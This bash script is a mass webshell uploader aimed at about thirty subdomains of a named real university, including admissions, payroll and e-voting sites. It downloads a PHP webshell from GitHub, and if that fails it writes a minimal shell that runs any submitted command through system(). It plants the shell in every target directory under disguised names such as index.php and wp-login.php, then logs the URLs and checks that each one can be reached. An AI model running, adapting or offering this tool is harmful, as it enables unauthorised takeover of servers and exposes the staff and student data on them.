#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Banner
echo -e "${CYAN}"
echo "╔═══════════════════════════════════════════════════════════════════╗"
echo "║           Mass Uploader - UMRI Domains                           ║"
echo "║                   By: AstarGanz                                   ║"
echo "╚═══════════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Base directory
BASE_DIR="/var/www/vhosts/umri.ac.id"

# Target directories
TARGETS=(
    "admisi.umri.ac.id"
    "aktold.umri.ac.id"
    "akt.umri.ac.id"
    "cbt.kebidanan.umri.ac.id"
    "daftarnew.umri.ac.id"
    "daftar.umri.ac.id"
    "diary-mbkm.umri.ac.id"
    "diarymbkm.umri.ac.id"
    "e-senat.umri.ac.id"
    "evoting.umri.ac.id"
    "fsp.umri.ac.id"
    "git"
    "httpdocs"
    "icbisea.umri.ac.id"
    "importer.umri.ac.id"
    "kekampus.umri.ac.id"
    "laravel.umri.ac.id"
    "logs"
    "manpro.umri.ac.id"
    "mbkm.umri.ac.id"
    "moodlefk.umri.ac.id"
    "payroll.umri.ac.id"
    "pmb.umri.ac.id"
    "posse.umri.ac.id"
    "schedule.umri.ac.id"
    "siam.umri.ac.id"
    "sikuli.umri.ac.id"
    "sneba.feb.umri.ac.id"
    "spi.umri.ac.id"
    "umri_profile"
    "vote.umri.ac.id"
)

# Download shell function
download_shell() {
    echo -e "${CYAN}[*] Downloading Garuda Webshell...${NC}"
    
    # Try different methods to download
    if command -v wget >/dev/null 2>&1; then
        wget -q -O /tmp/garuda.php https://raw.githubusercontent.com/pengodehandal/Garuda-Webshell/refs/heads/main/garuda.php
    elif command -v curl >/dev/null 2>&1; then
        curl -s -o /tmp/garuda.php https://raw.githubusercontent.com/pengodehandal/Garuda-Webshell/refs/heads/main/garuda.php
    else
        # Fallback - create minimal PHP shell if download fails
        echo -e "${YELLOW}[!] wget/curl not found, creating minimal shell...${NC}"
        cat > /tmp/garuda.php << 'PHPEOF'
<?php
// Garuda Webshell
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
} elseif(isset($_POST['cmd'])) {
    system($_POST['cmd']);
}
?>
<form method="POST">
Command: <input type="text" name="cmd" size="50">
<input type="submit" value="Execute">
</form>
PHPEOF
    fi
    
    if [ -s /tmp/garuda.php ]; then
        echo -e "${GREEN}[✓] Shell downloaded successfully${NC}"
        return 0
    else
        echo -e "${RED}[✗] Failed to download shell${NC}"
        return 1
    fi
}

# Upload function
upload_to_target() {
    local target=$1
    local full_path="${BASE_DIR}/${target}"
    
    # Check if directory exists
    if [ ! -d "$full_path" ]; then
        echo -e "${RED}[✗] Directory not found: ${target}${NC}"
        return 1
    fi
    
    # Try to copy file with different names
    local shell_names=("garuda.php" "index.php" "shell.php" "test.php" "wp-login.php" "admin.php")
    
    for shell_name in "${shell_names[@]}"; do
        if cp /tmp/garuda.php "${full_path}/${shell_name}" 2>/dev/null; then
            chmod 644 "${full_path}/${shell_name}" 2>/dev/null
            echo -e "${GREEN}[✓] SUCCESS: ${target}/${shell_name}${NC}"
            echo "https://${target}/${shell_name}" >> /tmp/shell_urls.txt
            return 0
        fi
    done
    
    echo -e "${RED}[✗] FAILED: ${target} (Permission denied)${NC}"
    return 1
}

# Main execution
main() {
    local success=0
    local failed=0
    local total=${#TARGETS[@]}
    
    # Download shell first
    if ! download_shell; then
        echo -e "${RED}[!] Cannot proceed without shell file${NC}"
        exit 1
    fi
    
    echo -e "\n${CYAN}[*] Starting mass upload to ${total} targets...${NC}\n"
    
    # Clear previous URLs
    > /tmp/shell_urls.txt
    
    # Upload to each target
    for target in "${TARGETS[@]}"; do
        if upload_to_target "$target"; then
            ((success++))
        else
            ((failed++))
        fi
        sleep 0.1
    done
    
    # Summary
    echo ""
    echo -e "${CYAN}╔═══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║                    UPLOAD COMPLETE!                               ║${NC}"
    echo -e "${CYAN}╚═══════════════════════════════════════════════════════════════════╝${NC}"
    echo -e "${GREEN}  Success: ${success}${NC}"
    echo -e "${RED}  Failed : ${failed}${NC}"
    echo -e "${YELLOW}  Total  : ${total}${NC}"
    echo ""
    
    # Show URLs
    if [ -s /tmp/shell_urls.txt ]; then
        echo -e "${CYAN}[*] Shell URLs:${NC}"
        cat /tmp/shell_urls.txt
        echo ""
        echo -e "${GREEN}[+] URLs saved to: /tmp/shell_urls.txt${NC}"
        
        # Create access script
        cat > /tmp/access_shells.sh << 'EOF'
#!/bin/bash
echo "Testing shell access..."
for url in $(cat /tmp/shell_urls.txt); do
    echo -n "Testing $url ... "
    if curl -s -I "$url" | head -1 | grep -q "200\|403"; then
        echo "OK"
    else
        echo "FAIL"
    fi
done
EOF
        chmod +x /tmp/access_shells.sh
        echo -e "${GREEN}[+] Access test script: /tmp/access_shells.sh${NC}"
    fi
    
    # Cleanup
    echo -e "\n${YELLOW}[*] Note: Shell file remains at /tmp/garuda.php for reuse${NC}"
}

# Run
main